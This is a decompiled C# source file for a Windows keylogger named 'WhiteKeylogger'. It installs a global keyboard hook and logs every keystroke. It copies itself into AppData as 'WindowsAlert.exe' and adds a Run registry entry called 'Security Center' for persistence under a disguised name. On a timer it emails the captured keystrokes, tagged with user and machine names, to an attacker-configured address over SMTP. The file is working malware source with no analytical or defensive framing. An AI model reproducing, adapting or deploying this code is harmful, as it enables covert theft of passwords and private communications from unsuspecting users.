using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Microsoft.Win32;

namespace WhiteKeylogger;

internal class Program
{
	public delegate int keyboardHookProc(int code, int wParam, ref keyboardHookStruct lParam);

	public struct keyboardHookStruct
	{
		public int vkCode;

		public int scanCode;

		public int flags;

		public int time;

		public int dwExtraInfo;
	}

	private const int WH_KEYBOARD_LL = 13;

	private const int WM_KEYDOWN = 256;

	private const int WM_KEYUP = 257;

	private const int WM_SYSKEYDOWN = 260;

	private const int WM_SYSKEYUP = 261;

	private static readonly keyboardHookProc staticKeyboardHookProc = hookProc;

	private static IntPtr hhook = IntPtr.Zero;

	private static string Log = string.Empty;

	private static byte shift = 0;

	private static string fa = string.Empty;

	private static string un = string.Empty;

	private static string pw = string.Empty;

	private static string ht = string.Empty;

	private static string ssl = string.Empty;

	private static string mt = string.Empty;

	private static int ti = 900000;

	private static int prt = 587;

	[DllImport("user32.dll")]
	private static extern IntPtr SetWindowsHookEx(int idHook, keyboardHookProc callback, IntPtr hInstance, uint threadId);

	[DllImport("user32.dll")]
	private static extern bool UnhookWindowsHookEx(IntPtr hInstance);

	[DllImport("user32.dll")]
	private static extern int CallNextHookEx(IntPtr idHook, int nCode, int wParam, ref keyboardHookStruct lParam);

	[DllImport("kernel32.dll")]
	private static extern IntPtr LoadLibrary(string lpFileName);

	private static void Main()
	{
		ResourceManager resourceManager = new ResourceManager("file", Assembly.GetExecutingAssembly());
		string @string = resourceManager.GetString("file");
		fa = @string.Split(new char[1] { '|' })[0];
		un = @string.Split(new char[1] { '|' })[1];
		pw = @string.Split(new char[1] { '|' })[2];
		ht = @string.Split(new char[1] { '|' })[3];
		ssl = @string.Split(new char[1] { '|' })[4];
		mt = @string.Split(new char[1] { '|' })[5];
		ti = int.Parse(@string.Split(new char[1] { '|' })[6]);
		prt = int.Parse(@string.Split(new char[1] { '|' })[7]);
		bool flag = true;
		IntPtr hInstance = LoadLibrary("User32");
		hhook = SetWindowsHookEx(13, staticKeyboardHookProc, hInstance, 0u);
		System.Timers.Timer timer = new System.Timers.Timer();
		timer.Elapsed += OnTimedEvent;
		timer.Interval = ti * 60000;
		timer.Enabled = true;
		string fileName = Process.GetCurrentProcess().MainModule!.FileName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WindowsAlert.exe";
		if (!File.Exists(text))
		{
			File.Copy(fileName, text);
		}
		string subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
		string name = "Security Center";
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(subkey);
		registryKey.SetValue(name, text);
		Application.Run();
		while (flag)
		{
			Thread.Sleep(1);
		}
		timer.Enabled = false;
		UnhookWindowsHookEx(hhook);
	}

	private static void OnTimedEvent(object sender, ElapsedEventArgs e)
	{
		//IL_012a: Unknown result type (might be due to invalid IL or missing references)
		SmtpClient smtpClient = new SmtpClient();
		NetworkCredential networkCredential = new NetworkCredential();
		MailMessage mailMessage = new MailMessage();
		MailAddress from = new MailAddress(fa);
		mailMessage.BodyEncoding = Encoding.UTF8;
		mailMessage.SubjectEncoding = Encoding.UTF8;
		networkCredential.UserName = un;
		networkCredential.Password = pw;
		smtpClient.Host = ht;
		smtpClient.Port = prt;
		smtpClient.UseDefaultCredentials = false;
		smtpClient.Credentials = networkCredential;
		if (ssl == "true")
		{
			smtpClient.EnableSsl = true;
		}
		else
		{
			smtpClient.EnableSsl = false;
		}
		smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;
		mailMessage.From = from;
		mailMessage.Subject = DateTime.Now.ToString("HH:mm:ss dd-MM-yyyy") + " - " + Environment.UserName.ToString() + "@" + Environment.MachineName.ToString();
		mailMessage.IsBodyHtml = false;
		mailMessage.Body = Log;
		mailMessage.To.Add(mt);
		try
		{
			smtpClient.Send(mailMessage);
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.ToString());
		}
		Log = string.Empty;
	}

	public static int hookProc(int code, int wParam, ref keyboardHookStruct lParam)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Invalid comparison between I4 and Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d9: Expected I4, but got Unknown
		//IL_01d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01df: Unknown result type (might be due to invalid IL or missing references)
		//IL_0201: Expected I4, but got Unknown
		//IL_0201: Unknown result type (might be due to invalid IL or missing references)
		//IL_0207: Unknown result type (might be due to invalid IL or missing references)
		//IL_021d: Expected I4, but got Unknown
		if (code >= 0)
		{
			Keys val = (Keys)lParam.vkCode;
			KeyEventArgs val2 = new KeyEventArgs(val);
			if (wParam == 257 || wParam == 261)
			{
				if (65536 == (int)Control.get_ModifierKeys())
				{
					shift = 1;
				}
				else
				{
					shift = 0;
				}
				Keys keyCode = val2.get_KeyCode();
				switch (keyCode - 8)
				{
				default:
					switch (keyCode - 186)
					{
					default:
						switch (keyCode - 219)
						{
						case 0:
							if (shift == 0)
							{
								Log += "[";
							}
							else
							{
								Log += "{";
							}
							break;
						case 1:
							if (shift == 0)
							{
								Log += "\\";
							}
							else
							{
								Log += "|";
							}
							break;
						case 2:
							if (shift == 0)
							{
								Log += "]";
							}
							else
							{
								Log += "}";
							}
							break;
						case 3:
							if (shift == 0)
							{
								Log += "'";
							}
							else
							{
								Log += "\"";
							}
							break;
						}
						break;
					case 0:
						if (shift == 0)
						{
							Log += ";";
						}
						else
						{
							Log += ":";
						}
						break;
					case 1:
						if (shift == 0)
						{
							Log += "=";
						}
						else
						{
							Log += "+";
						}
						break;
					case 2:
						if (shift == 0)
						{
							Log += ",";
						}
						else
						{
							Log += "<";
						}
						break;
					case 3:
						if (shift == 0)
						{
							Log += "-";
						}
						else
						{
							Log += "_";
						}
						break;
					case 4:
						if (shift == 0)
						{
							Log += ".";
						}
						else
						{
							Log += ">";
						}
						break;
					case 5:
						if (shift == 0)
						{
							Log += "/";
						}
						else
						{
							Log += "?";
						}
						break;
					case 6:
						if (shift == 0)
						{
							Log += "`";
						}
						else
						{
							Log += "~";
						}
						break;
					}
					break;
				case 0:
					Log += "[Backspace]";
					break;
				case 1:
					Log += "[Tab]";
					break;
				case 2:
					Log += "[LineFeed]";
					break;
				case 4:
					Log += "[Clear]";
					break;
				case 5:
					Log += "\r\n";
					break;
				case 12:
					Log += "[CapsLock]";
					break;
				case 19:
					Log += "[Escape]";
					break;
				case 24:
					Log += " ";
					break;
				case 38:
					Log += "[Delete]";
					break;
				case 40:
					if (shift == 0)
					{
						Log += "0";
					}
					else
					{
						Log += ")";
					}
					break;
				case 41:
					if (shift == 0)
					{
						Log += "1";
					}
					else
					{
						Log += "!";
					}
					break;
				case 42:
					if (shift == 0)
					{
						Log += "2";
					}
					else
					{
						Log += "@";
					}
					break;
				case 43:
					if (shift == 0)
					{
						Log += "3";
					}
					else
					{
						Log += "#";
					}
					break;
				case 44:
					if (shift == 0)
					{
						Log += "4";
					}
					else
					{
						Log += "$";
					}
					break;
				case 45:
					if (shift == 0)
					{
						Log += "5";
					}
					else
					{
						Log += "%";
					}
					break;
				case 46:
					if (shift == 0)
					{
						Log += "6";
					}
					else
					{
						Log += "^";
					}
					break;
				case 47:
					if (shift == 0)
					{
						Log += "7";
					}
					else
					{
						Log += "&";
					}
					break;
				case 48:
					if (shift == 0)
					{
						Log += "8";
					}
					else
					{
						Log += "*";
					}
					break;
				case 49:
					if (shift == 0)
					{
						Log += "9";
					}
					else
					{
						Log += "(";
					}
					break;
				case 57:
					if (shift == 0)
					{
						Log += "a";
					}
					else
					{
						Log += "A";
					}
					break;
				case 58:
					if (shift == 0)
					{
						Log += "b";
					}
					else
					{
						Log += "B";
					}
					break;
				case 59:
					if (shift == 0)
					{
						Log += "c";
					}
					else
					{
						Log += "C";
					}
					break;
				case 60:
					if (shift == 0)
					{
						Log += "d";
					}
					else
					{
						Log += "D";
					}
					break;
				case 61:
					if (shift == 0)
					{
						Log += "e";
					}
					else
					{
						Log += "E";
					}
					break;
				case 62:
					if (shift == 0)
					{
						Log += "f";
					}
					else
					{
						Log += "F";
					}
					break;
				case 63:
					if (shift == 0)
					{
						Log += "g";
					}
					else
					{
						Log += "G";
					}
					break;
				case 64:
					if (shift == 0)
					{
						Log += "h";
					}
					else
					{
						Log += "H";
					}
					break;
				case 65:
					if (shift == 0)
					{
						Log += "i";
					}
					else
					{
						Log += "I";
					}
					break;
				case 66:
					if (shift == 0)
					{
						Log += "j";
					}
					else
					{
						Log += "J";
					}
					break;
				case 67:
					if (shift == 0)
					{
						Log += "k";
					}
					else
					{
						Log += "K";
					}
					break;
				case 68:
					if (shift == 0)
					{
						Log += "l";
					}
					else
					{
						Log += "L";
					}
					break;
				case 69:
					if (shift == 0)
					{
						Log += "m";
					}
					else
					{
						Log += "M";
					}
					break;
				case 70:
					if (shift == 0)
					{
						Log += "n";
					}
					else
					{
						Log += "N";
					}
					break;
				case 71:
					if (shift == 0)
					{
						Log += "o";
					}
					else
					{
						Log += "O";
					}
					break;
				case 72:
					if (shift == 0)
					{
						Log += "p";
					}
					else
					{
						Log += "P";
					}
					break;
				case 73:
					if (shift == 0)
					{
						Log += "q";
					}
					else
					{
						Log += "Q";
					}
					break;
				case 74:
					if (shift == 0)
					{
						Log += "r";
					}
					else
					{
						Log += "R";
					}
					break;
				case 75:
					if (shift == 0)
					{
						Log += "s";
					}
					else
					{
						Log += "S";
					}
					break;
				case 76:
					if (shift == 0)
					{
						Log += "t";
					}
					else
					{
						Log += "T";
					}
					break;
				case 77:
					if (shift == 0)
					{
						Log += "u";
					}
					else
					{
						Log += "U";
					}
					break;
				case 78:
					if (shift == 0)
					{
						Log += "v";
					}
					else
					{
						Log += "V";
					}
					break;
				case 79:
					if (shift == 0)
					{
						Log += "w";
					}
					else
					{
						Log += "W";
					}
					break;
				case 80:
					if (shift == 0)
					{
						Log += "x";
					}
					else
					{
						Log += "X";
					}
					break;
				case 81:
					if (shift == 0)
					{
						Log += "y";
					}
					else
					{
						Log += "Y";
					}
					break;
				case 82:
					if (shift == 0)
					{
						Log += "z";
					}
					else
					{
						Log += "Z";
					}
					break;
				case 88:
					Log += "0";
					break;
				case 89:
					Log += "1";
					break;
				case 90:
					Log += "2";
					break;
				case 91:
					Log += "3";
					break;
				case 92:
					Log += "4";
					break;
				case 93:
					Log += "5";
					break;
				case 94:
					Log += "6";
					break;
				case 95:
					Log += "7";
					break;
				case 96:
					Log += "8";
					break;
				case 97:
					Log += "9";
					break;
				case 3:
				case 6:
				case 7:
				case 8:
				case 9:
				case 10:
				case 11:
				case 13:
				case 14:
				case 15:
				case 16:
				case 17:
				case 18:
				case 20:
				case 21:
				case 22:
				case 23:
				case 25:
				case 26:
				case 27:
				case 28:
				case 29:
				case 30:
				case 31:
				case 32:
				case 33:
				case 34:
				case 35:
				case 36:
				case 37:
				case 39:
				case 50:
				case 51:
				case 52:
				case 53:
				case 54:
				case 55:
				case 56:
				case 83:
				case 84:
				case 85:
				case 86:
				case 87:
					break;
				}
			}
		}
		return CallNextHookEx(hhook, code, wParam, ref lParam);
	}
}
